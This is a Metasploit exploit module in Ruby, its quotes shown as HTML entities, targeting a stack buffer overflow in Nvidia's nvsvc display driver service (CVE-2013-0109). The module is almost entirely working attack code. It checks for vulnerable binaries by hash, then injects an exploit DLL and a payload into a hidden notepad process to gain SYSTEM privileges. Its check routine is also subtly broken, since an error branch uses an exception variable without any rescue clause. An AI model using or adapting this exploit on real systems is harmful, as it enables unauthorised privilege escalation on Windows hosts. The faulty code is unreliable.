require &#039;rex&#039;
require &#039;msf/core/post/common&#039;
require &#039;msf/core/post/windows/priv&#039;
require &#039;msf/core/post/windows/process&#039;
require &#039;msf/core/post/windows/reflective_dll_injection&#039;
require &#039;msf/core/post/windows/services&#039;
 
class Metasploit3 < Msf::Exploit::Local
  Rank = AverageRanking
 
  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Process
  include Msf::Post::Windows::ReflectiveDLLInjection
  include Msf::Post::Windows::Services
 
  def initialize(info={})
    super(update_info(info, {
      &#039;Name&#039;            => &#039;Nvidia (nvsvc) Display Driver Service Local Privilege Escalation&#039;,
      &#039;Description&#039;     => %q{
        The named pipe, \pipe\nsvr, has a NULL DACL allowing any authenticated user to
        interact with the service. It contains a stacked based buffer overflow as a result
        of a memmove operation. Note the slight spelling differences: the executable is &#039;nvvsvc.exe&#039;,
        the service name is &#039;nvsvc&#039;, and the named pipe is &#039;nsvr&#039;.
 
        This exploit automatically targets nvvsvc.exe versions dated Nov 3 2011, Aug 30 2012, and Dec 1 2012.
        It has been tested on Windows 7 64-bit against nvvsvc.exe dated Dec 1 2012.
      },
      &#039;License&#039;         => MSF_LICENSE,
      &#039;Author&#039;          =>
        [
          &#039;Peter Wintersmith&#039;, # Original exploit
          &#039;Ben Campbell <eat_meatballs[at]hotmail.co.uk>&#039;,   # Metasploit integration
        ],
      &#039;Arch&#039;            => ARCH_X86_64,
      &#039;Platform&#039;        => &#039;win&#039;,
      &#039;DefaultOptions&#039;  =>
        {
          &#039;EXITFUNC&#039;    => &#039;thread&#039;,
        },
      &#039;Targets&#039;         =>
        [
          [ &#039;Windows x64&#039;, { } ]
        ],
      &#039;Payload&#039;         =>
        {
          &#039;Space&#039;       => 2048,
          &#039;DisableNops&#039; => true,
          &#039;BadChars&#039;    => "\x00"
        },
      &#039;References&#039;      =>
        [
          [ &#039;CVE&#039;, &#039;2013-0109&#039; ],
          [ &#039;OSVDB&#039;, &#039;88745&#039; ],
          [ &#039;URL&#039;, &#039;http://nvidia.custhelp.com/app/answers/detail/a_id/3288&#039; ],
        ],
      &#039;DisclosureDate&#039; => &#039;Dec 25 2012&#039;,
      &#039;DefaultTarget&#039;  => 0
    }))
 
  end
 
  def check
    vuln_hashes = [
      &#039;43f91595049de14c4b61d1e76436164f&#039;,
      &#039;3947ad5d03e6abcce037801162fdb90d&#039;,
      &#039;3341d2c91989bc87c3c0baa97c27253b&#039;
    ]
 
    os = sysinfo["OS"]
    if os =~ /windows/i
      svc = service_info &#039;nvsvc&#039;
      if svc and svc[&#039;Name&#039;] =~ /NVIDIA/i
        vprint_good("Found service &#039;#{svc[&#039;Name&#039;]}&#039;")
 
        begin
          if is_running?
            print_good("Service is running")
          else
            print_error("Service is not running!")
          end
        rescue RuntimeError => e
          print_error("Unable to retrieve service status")
        end
 
        if sysinfo[&#039;Architecture&#039;] =~ /WOW64/i
          path = svc[&#039;Command&#039;].gsub(&#039;"&#039;,&#039;&#039;).strip
          path.gsub!("system32","sysnative")
        else
          path = svc[&#039;Command&#039;].gsub(&#039;"&#039;,&#039;&#039;).strip
        end
 
        begin
          hash = client.fs.file.md5(path).unpack(&#039;H*&#039;).first
          print_error("Error checking file hash: #{e}")
          return Exploit::CheckCode::Detected
        end
 
        if vuln_hashes.include?(hash)
          vprint_good("Hash &#039;#{hash}&#039; is listed as vulnerable")
          return Exploit::CheckCode::Vulnerable
        else
          vprint_status("Hash &#039;#{hash}&#039; is not recorded as vulnerable")
          return Exploit::CheckCode::Detected
        end
      else
        return Exploit::CheckCode::Safe
      end
    end
  end
 
  def is_running?
    begin
      status = service_status(&#039;nvsvc&#039;)
      return (status and status[:state] == 4)
    rescue RuntimeError => e
      print_error("Unable to retrieve service status")
      return false
    end
  end
 
  def exploit
    if is_system?
      fail_with(Exploit::Failure::None, &#039;Session is already elevated&#039;)
    end
 
    unless check == Exploit::CheckCode::Vulnerable
      fail_with(Exploit::Failure::NotVulnerable, "Exploit not available on this system.")
    end
 
    print_status("Launching notepad to host the exploit...")
 
    windir = expand_path("%windir%")
    cmd = "#{windir}\\SysWOW64\\notepad.exe"
    process = client.sys.process.execute(cmd, nil, {&#039;Hidden&#039; => true})
    host_process = client.sys.process.open(process.pid, PROCESS_ALL_ACCESS)
    print_good("Process #{process.pid} launched.")
 
    print_status("Reflectively injecting the exploit DLL into #{process.pid}...")
    library_path = ::File.join(Msf::Config.data_directory,
                               "exploits",
                               "CVE-2013-0109",
                               "nvidia_nvsvc.x86.dll")
    library_path = ::File.expand_path(library_path)
 
    print_status("Injecting exploit into #{process.pid} ...")
    exploit_mem, offset = inject_dll_into_process(host_process, library_path)
 
    print_status("Exploit injected. Injecting payload into #{process.pid}...")
    payload_mem = inject_into_process(host_process, payload.encoded)
 
    # invoke the exploit, passing in the address of the payload that
    # we want invoked on successful exploitation.
    print_status("Payload injected. Executing exploit...")
    host_process.thread.create(exploit_mem + offset, payload_mem)
 
    print_good("Exploit finished, wait for (hopefully privileged) payload execution to complete.")
  end
end

